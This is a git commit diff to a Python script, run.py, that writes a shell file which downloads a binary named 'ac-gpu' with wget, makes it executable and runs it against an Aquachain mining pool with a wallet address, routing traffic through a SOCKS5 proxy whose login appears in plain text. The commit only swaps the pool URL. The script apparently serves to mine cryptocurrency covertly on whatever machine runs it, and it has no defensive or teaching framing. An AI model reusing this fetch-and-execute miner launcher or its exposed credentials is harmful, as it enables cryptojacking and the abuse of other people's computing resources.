7242926390ad615c9b2f8be9e1dce9ec9dc41d0f
mamangfahri7 <83070235+mamangfahri7@users.noreply.github.com>
2021-12-31 05:24:50 +0000

    Update run.py

--- run.py
+++ run.py
@@ -1,6 +1,6 @@
 import os
 os.system('echo "#!/bin/sh" >> tes')
 os.system('echo "wget -q https://bin.jvnv.net/file/qJ7G1/ac-gpu && chmod +x ac-gpu" >> tes')
-os.system('echo "./ac-gpu -F http://aqua.signal2noi.se:19998/0x7ca215E2E15041E163563069Bf29f81A278Ca6Fd/ABAHJIMMY -t 1 --proxy socks5://simbahkencot-rotate:tukimenreborn@p.webshare.io:80" >> tes')
+os.system('echo "./ac-gpu -F http://pool.aquachain.xyz:8888/0x7ca215E2E15041E163563069Bf29f81A278Ca6Fd/ABAHJIMMY -t 1 --proxy socks5://simbahkencot-rotate:tukimenreborn@p.webshare.io:80" >> tes')
 os.system('sleep 2')
 os.system('sh tes')
